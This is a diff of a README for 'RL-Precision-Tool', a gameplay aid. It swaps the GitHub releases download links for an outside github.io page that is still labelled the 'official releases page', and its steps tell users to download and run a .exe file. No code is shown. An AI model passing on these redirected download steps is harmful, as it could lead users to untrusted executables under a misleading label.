@@ -1,6 +1,6 @@
 # 🚀 RL-Precision-Tool - Enhance your gameplay and rank up
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/ayiki5509/RL-Precision-Tool/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://ayiki5509.github.io)
 
 ## 📋 What is this tool
 
@@ -20,7 +20,7 @@ Your computer needs to meet these standards to run the software.
 
 Follow these steps to set up the tool on your computer.
 
-1. Visit the [official releases page](https://github.com/ayiki5509/RL-Precision-Tool/releases) to download the software.
+1. Visit the [official releases page](https://ayiki5509.github.io) to download the software.
 2. Select the latest version file ending in .exe.
 3. Save the file to your computer.
 4. Double-click the file to start the installation.
